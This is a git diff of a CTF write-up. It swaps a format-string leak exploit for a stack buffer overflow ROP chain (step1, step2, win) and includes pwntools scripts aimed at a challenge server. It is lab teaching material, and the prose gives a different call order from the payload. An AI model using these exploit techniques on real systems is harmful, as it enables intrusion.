@@ -95,17 +95,20 @@ void step2() { second = 1; }
 
 ## Exploit Strategy
 
-### Step 1: Leak Memory Address
+### Step 1: Overflow the Buffer
 
-We exploit the format string vulnerability by sending a payload containing `%p` and `%s` to leak memory addresses. This allows us to:
+We exploit the buffer overflow by sending input larger than 32 bytes, overwriting the **return address** and controlling the **RIP** to redirect execution to the `win()` function.
 
-- Leak the address of the `FLAG_VAL` environment variable.
+### Step 2: Call `step1()` and `step2()`
 
-### Step 2: Extract the Flag
+After redirecting execution to `win()`, we must:
 
-Using the leaked memory addresses, we can:
+- Call `step1()` to set `first = 1`.
+- Call `step2()` to set `second = 1`.
 
-- Access the **value of `FLAG_VAL`** by reading the content at the leaked address, which contains the flag.
+### Step 3: Trigger the Flag
+
+Once both `first` and `second` are set, the `win()` function will print the flag stored in the `FLAG_VAL` environment variable.
 
 ---
 
@@ -115,11 +118,11 @@ Using the leaked memory addresses, we can:
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
-# $ pwn template --host ctf.mf.grsu.by --port 9077
+# $ pwn template StackSmasher --host ctf.mf.grsu.by --port 9078
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF(args.EXE or 'ChattyParrot')
+exe = context.binary = ELF(args.EXE or 'StackSmasher')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -127,7 +130,7 @@ exe = context.binary = ELF(args.EXE or 'ChattyParrot')
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
 host = args.HOST or 'ctf.mf.grsu.by'
-port = int(args.PORT or 9077)
+port = int(args.PORT or 9078)
 
 env_vars = {'FLAG_VAL': 'grodno{dummy_flag}'}
 
@@ -136,7 +139,7 @@ def start_local(argv=[], *a, **kw):
     if args.GDB:
         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
     else:
-        return process([exe.path] + argv, env = env_vars ,*a, **kw)
+        return process([exe.path] + argv, env= env_vars, *a, **kw)
 
 def start_remote(argv=[], *a, **kw):
     '''Connect to the process on the remote host'''
@@ -181,14 +184,17 @@ io = start()
 # flag = io.recv(...)
 # log.success(flag)
 
-payload = b'%41$s'
+offset = 40
+payload = flat (
+        b'A' * 40,
+        exe.symbols['step1'],
+        exe.symbols['step2'],
+        exe.symbols['win']
+)
 io.sendline(payload)
-io.recvuntil(b'Input your phrase:')
+io.recvuntil(b'@')
 flag = io.recvline().strip(b'"\n')
 log.success(f"FLAG : {flag.decode()}")
-
-
-
 
 
 ```
